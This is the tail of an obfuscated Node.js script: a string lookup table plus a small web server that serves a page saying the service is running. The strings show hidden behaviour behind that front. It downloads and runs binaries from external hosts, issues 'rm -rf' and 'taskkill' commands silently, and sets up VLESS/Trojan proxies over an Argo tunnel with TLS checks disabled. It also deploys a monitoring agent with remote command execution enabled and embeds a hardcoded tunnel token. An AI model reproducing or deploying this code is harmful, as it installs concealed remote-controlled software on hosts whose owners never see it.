    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'freedom',
    'rm\x20-rf\x20',
    'axios',
    'readdirSync',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'basename',
    'https://amd64.ssss.nyc.mn/v1',
    '/vless-argo',
    'direct',
    'filter',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'https://arm64.ssss.nyc.mn/v1',
    'includes',
    'list.txt',
    'send',
    'floor',
    'success',
    '800',
    'readFileSync',
    'log',
    '\x22\x20>\x20/dev/null\x202>&1',
    '\x20already\x20exists',
    'vless',
    'http',
    '/api/delete-nodes',
    'util',
    '\x0avless://',
    '02abb320-e1af-4df2-a04c-59ad1482bc69',
    '/api/add-nodes',
    'taskkill\x20/f\x20/im\x20',
    '25138rpONfO',
    '\x20>/dev/null\x202>&1\x20&',
    'set',
    'trojan',
    'NEZHA_SERVER',
    'org',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    '443',
    '?security=tls&sni=',
    'toString',
    '\x20failed:\x20',
    'writeFileSync',
    'tcp',
    'all',
    'boot.log',
    'readFile',
    'utf-8',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    'blackhole',
    '\x0a\x0atrojan://',
    '.exe\x20>\x20nul\x202>&1',
    '2053',
    '\x0aclient_secret:\x20',
    'path',
    'Error\x20in\x20startserver:',
    'mkdirSync',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    'length',
    'env',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'web\x20running\x20error:\x20',
    '/dev/null',
    '\x20>/dev/null\x202>&1',
    'https+local://8.8.8.8/dns-query',
    'ARGO_DOMAIN:',
    'status',
    'join',
    '127.0.0.1',
    'get',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'Error\x20reading\x20boot.log:',
    '/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:',
    '?encryption=none&security=tls&sni=',
    'PORT',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiMWYzMGY3NTAtMzIyYS00ZWFhLTlkNzEtMjJjZWRhMWZlZjg0IiwicyI6Ik5EY3lOV1ZrTlRRdE1tVm1NaTAwWTJJNExUaGpNV1F0Tm1OaVlXWTJNR0V5TUdVdyJ9',
    'response'
  ]
  _0x13ff = function () {
    return _0x58483a
  }
  return _0x13ff()
}
;(startserver()[_0x57a1fe(0x23b)]((_0x18b25b) => {
  const _0x2cba65 = _0x57a1fe
  console[_0x2cba65(0x1e4)]('Unhandled\x20error\x20in\x20startserver:', _0x18b25b)
}),
  app[_0x57a1fe(0x233)]('/', async function (_0x1243b7, _0x2ca56c) {
    const _0x312cb4 = _0x57a1fe
    try {
      const _0x2cfa30 = path[_0x312cb4(0x231)](__dirname, 'index.html'),
        _0x161da8 = await fs[_0x312cb4(0x195)][_0x312cb4(0x21b)](_0x2cfa30, 'utf8')
      _0x2ca56c['send'](_0x161da8)
    } catch (_0xdf2121) {
      _0x2ca56c[_0x312cb4(0x1fc)]('Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!')
    }
  }),
  app[_0x57a1fe(0x1bd)](PORT, () => console[_0x57a1fe(0x201)]('http\x20server\x20is\x20running\x20on\x20port:' + PORT + '!')))
